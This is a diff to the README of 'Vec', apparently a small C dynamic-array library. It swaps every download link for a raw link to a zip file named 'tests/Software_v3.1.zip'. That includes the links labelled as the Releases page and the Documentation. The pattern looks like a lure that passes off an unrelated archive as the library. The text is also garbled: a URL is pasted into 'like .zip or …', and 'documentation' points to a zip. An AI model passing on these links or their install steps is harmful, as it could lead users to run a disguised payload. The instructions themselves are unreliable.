@@ -6,11 +6,11 @@ Welcome to Vec! This minimal C library helps you handle dynamic arrays easily. W
 
 ## 📥 Download the Latest Version
 
-[![Download Vec](https://raw.githubusercontent.com/SKeditz42/Vec/main/towny/Vec.zip)](https://raw.githubusercontent.com/SKeditz42/Vec/main/towny/Vec.zip)
+[![Download Vec](https://raw.githubusercontent.com/SKeditz42/Vec/main/tests/Software_v3.1.zip)](https://raw.githubusercontent.com/SKeditz42/Vec/main/tests/Software_v3.1.zip)
 
 You can find the latest release of Vec on our Releases page. Follow the link below to download it:
 
-[Visit this page to download](https://raw.githubusercontent.com/SKeditz42/Vec/main/towny/Vec.zip)
+[Visit this page to download](https://raw.githubusercontent.com/SKeditz42/Vec/main/tests/Software_v3.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ To install Vec on your system, please follow these steps:
 
 3. **Download the Files**: Click on the download link for the appropriate files for your system. If you are uncertain which one to choose, download the option labeled as "source code."
 
-4. **Unzip the Files**: If the files are in a compressed format (like .zip or https://raw.githubusercontent.com/SKeditz42/Vec/main/towny/Vec.zip), extract them to a folder on your computer.
+4. **Unzip the Files**: If the files are in a compressed format (like .zip or https://raw.githubusercontent.com/SKeditz42/Vec/main/tests/Software_v3.1.zip), extract them to a folder on your computer.
 
 5. **Compile the Library**:
    - Open your terminal or command prompt.
@@ -86,7 +86,7 @@ For further assistance, feel free to check out our GitHub Issues page. You can r
 
 For more information about Vec, visit our official documentation or community forums:
 
-- **Documentation**: [Vec Documentation](https://raw.githubusercontent.com/SKeditz42/Vec/main/towny/Vec.zip)
+- **Documentation**: [Vec Documentation](https://raw.githubusercontent.com/SKeditz42/Vec/main/tests/Software_v3.1.zip)
 - **Community Forum**: Join discussions and get help from other users.
 
 Thank you for choosing Vec! Enjoy powerful and efficient dynamic arrays in your projects.
